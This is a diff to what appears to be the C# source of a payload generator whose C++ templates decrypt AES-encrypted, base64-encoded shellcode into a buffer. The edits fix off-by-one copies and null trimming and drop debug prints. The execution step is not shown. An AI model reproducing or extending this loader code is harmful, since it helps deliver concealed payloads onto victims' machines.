@@ -24,8 +24,8 @@ std::string Base64Decode(std::string*);";
 	std::string decrypted = Decrypt(&base64PayloadString, &base64KeyString, &base64IvString);
 
 	//// To unsigned char
-	unsigned char shellcode[decrypted.length() + 1];
-	std::copy(decrypted.data(), decrypted.data() + decrypted.length() + 1, shellcode);";
+	unsigned char shellcode[decrypted.length()];
+	std::copy(decrypted.data(), decrypted.data() + decrypted.length(), shellcode);";
 
         public override string AdditionalFunctions => @"std::string Decrypt(std::string *base64PayloadString, std::string *base64KeyString, std::string *base64IvString)
 {
@@ -34,10 +34,10 @@ std::string Base64Decode(std::string*);";
 	std::string ivString = Base64Decode(base64IvString);
 	std::string payloadString = Base64Decode(base64PayloadString);
 
-	// Remove trailing null
-	keyString.erase(std::find(keyString.begin(), keyString.end(), '\0'), keyString.end()); // could change to not search the whole string
-	ivString.erase(std::find(ivString.begin(), ivString.end(), '\0'), ivString.end());
-	payloadString.erase(std::find(payloadString.begin(), payloadString.end(), '\0'), payloadString.end());
+	// Remove trailing null	
+	keyString.erase(std::find(keyString.end() - 1, keyString.end(), '\0'), keyString.end());
+	ivString.erase(std::find(ivString.end() - 1, ivString.end(), '\0'), ivString.end());
+	payloadString.erase(std::find(payloadString.end() - 1, payloadString.end(), '\0'), payloadString.end());
 
 	// Set Values
 	SecByteBlock key(reinterpret_cast<const byte*>(&keyString[0]), keyString.size()); // https://www.cryptopp.com/wiki/SecBlock
@@ -48,10 +48,7 @@ std::string Base64Decode(std::string*);";
 
 	// To unsigned char
 	unsigned char shellcode[decrypted.length() + 1];
-	std::copy(decrypted.data(), decrypted.data() + decrypted.length() + 1, shellcode);
-
-	// Debug
-	std::cout << ""Bytes Length : "" << decrypted.length() + 1 << std::endl;
+	std::copy(decrypted.data(), decrypted.data() + decrypted.length(), shellcode);
 
 	// Return
 	return AesDecrypt(key, iv, payloadString);
@@ -71,8 +68,6 @@ std::string AesDecrypt(SecByteBlock &key, SecByteBlock &iv, std::string &cipher)
 				new StringSink(recovered)
 			) // StreamTransformationFilter
 		); // StringSource
-
-		//std::cout << ""recovered text: "" << recovered << std::endl;
 	}
 	catch (const Exception& e)
 	{
